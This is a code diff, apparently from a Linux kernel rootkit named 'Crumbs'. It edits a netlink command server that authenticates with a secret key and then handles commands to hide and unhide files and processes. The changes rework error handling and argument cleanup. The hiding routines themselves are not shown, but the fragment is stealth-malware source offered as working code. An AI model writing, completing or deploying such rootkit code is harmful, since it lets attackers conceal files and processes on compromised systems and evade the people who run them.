@@ -7,6 +7,9 @@ static struct workqueue_struct *wq;
 
 void exec_cmd(struct cmd_t *cmd)
 {
+    char proc_path[1024];
+    int res;
+
     if (cmd->id == AUTHENTICATION) {
         dbg("%s\n", cmd->arg);
         if (!strcmp(cmd->arg, CRUMBS_SECRET_KEY)) {
@@ -17,12 +20,14 @@ void exec_cmd(struct cmd_t *cmd)
         switch(cmd->id)
         {
             case HIDE_FILE:
-                vfs_hide_file(cmd->arg);
+                vfs_hide_file(str_remove_duplicates(cmd->arg));
                 break;
             case UNHIDE_FILE:
-                vfs_unhide_file(cmd->arg);
+                vfs_unhide_file(str_remove_duplicates(cmd->arg));
                 break;
             case HIDE_PROCESS:
+                // kstrtoul(cmd->arg, 10, &res);
+                // dbg("PID: %d\n", res);
                 break;
             case UNHIDE_PROCESS:
                 break;
@@ -103,23 +108,22 @@ static void crumbs_nl_recv_msg(struct sk_buff *skb)
     if (!skb_out)
     {
         dbg(KERN_ERR "Failed to allocate new skb\n");
-        return;
+    } else {
+        parse_cmd(nlmsg_data(nlh), &cmd);
+
+        nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
+        NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
+        // strncpy(nlmsg_data(nlh), msg, msg_size);
+        strncpy(nlmsg_data(nlh), msg, msg_size);
+
+
+        dbg("Crumbs server: %s\n", msg);
+
+        res = nlmsg_unicast(nl_sk, skb_out, pid);
+
+        if (res < 0)
+            dbg(KERN_INFO "Error while sending back to user\n");
     }
-
-    parse_cmd(nlmsg_data(nlh), &cmd);
-
-    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
-    NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
-    // strncpy(nlmsg_data(nlh), msg, msg_size);
-    strncpy(nlmsg_data(nlh), msg, msg_size);
-
-
-    dbg("Crumbs server: %s\n", msg);
-
-    res = nlmsg_unicast(nl_sk, skb_out, pid);
-
-    if (res < 0)
-        dbg(KERN_INFO "Error while sending back to user\n");
 }
 
 static void wq_crumbs_server(struct work_struct *work_arg)
@@ -139,12 +143,10 @@ static void wq_crumbs_server(struct work_struct *work_arg)
     if (!nl_sk)
     {
         dbg(KERN_ALERT "Error creating socket.\n");
-        return -10;
+    } else {
+        dbg("Crumbs server: \n");
+        kfree(c_ptr);        
     }
-
-    dbg("Crumbs server: \n");
-
-    kfree(c_ptr);
 }
 
 void crumbs_serv_init(void)
